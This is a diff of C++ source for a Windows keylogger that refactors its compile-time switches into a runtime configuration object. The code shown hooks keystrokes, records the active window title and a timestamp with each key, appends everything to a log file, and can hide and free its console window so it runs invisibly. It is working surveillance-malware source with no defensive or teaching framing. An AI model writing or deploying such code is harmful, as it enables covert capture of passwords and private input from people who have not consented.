@@ -9,7 +9,9 @@
 #include <windows.h>
 #include "keylabels.cpp"
 
-Keylogger::Keylogger(const std::string& filename) {
+const Config* g_config_ptr = nullptr;
+
+Keylogger::Keylogger(const std::string& filename, const Config& config) : config(&config) {
     logFile.open(filename, std::ios_base::app);
     hookHandle = nullptr;
     memset(lastWindow, 0, sizeof(lastWindow));
@@ -52,9 +54,9 @@ LRESULT CALLBACK Keylogger::HookCallback(int nCode, WPARAM wParam, LPARAM lParam
 }
 
 void Keylogger::LogKeystroke(int vkCode, bool isKeyDown) {
-#ifdef MOUSE_IGNORE
-    if (vkCode == 1 || vkCode == 2) return;
-#endif
+    if (config->mouse_ignore) {
+        if (vkCode == 1 || vkCode == 2) return;
+    }
 
     // Handle key press/release for modifier keys
     if (isKeyDown) {
@@ -80,22 +82,22 @@ void Keylogger::LogKey(int vkCode) {
         GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
     }
     std::stringstream keyLabel;
-#if FORMAT == 10
-    keyLabel << vkCode;
-#elif FORMAT == 16
-    keyLabel << std::hex << vkCode;
-#else
-    extern const std::map<int, std::string> keyLabels;
-    if (keyLabels.count(vkCode)) {
-        keyLabel << keyLabels.at(vkCode);
+    if (config->format == 10) {
+        keyLabel << vkCode;
+    } else if (config->format == 16) {
+        keyLabel << std::hex << vkCode;
     } else {
-        char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
-        bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-        if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
-        if (!isLowercase) ch = tolower(ch);
-        keyLabel << ch;
+        extern const std::map<int, std::string> keyLabels;
+        if (keyLabels.count(vkCode)) {
+            keyLabel << keyLabels.at(vkCode);
+        } else {
+            char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
+            bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+            if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
+            if (!isLowercase) ch = tolower(ch);
+            keyLabel << ch;
+        }
     }
-#endif
     time_t t = time(nullptr);
     struct tm timeInfo;
     localtime_s(&timeInfo, &t);
@@ -111,21 +113,26 @@ void Keylogger::LogKey(int vkCode) {
     logFile.flush();
 }
 
-void Keylogger::SetConsoleVisibility() {
-#ifdef INVISIBLE
-    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
-    FreeConsole();
-#endif
-#ifdef VISIBLE
-    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
-#endif
+void Keylogger::SetConsoleVisibility(const Config& config) {
+    if (!config.visible) {
+        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
+        FreeConsole();
+    } else {
+        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
+    }
 }
 
-bool Keylogger::IsSystemBooting() {
+bool Keylogger::IsSystemBooting(const Config& config) {
+    // You can use config.boot_wait if you want to change logic
     return false;
 }
 
-Keylogger& Keylogger::GetInstance() {
-    static Keylogger instance(log_file_name);
+Keylogger& Keylogger::GetInstance(const Config& config) {
+    static Keylogger instance(config.log_file_name, config);
     return instance;
+}
+
+Keylogger& Keylogger::GetInstance() {
+    if (!g_config_ptr) throw std::runtime_error("Config pointer not set");
+    return GetInstance(*g_config_ptr);
 } 
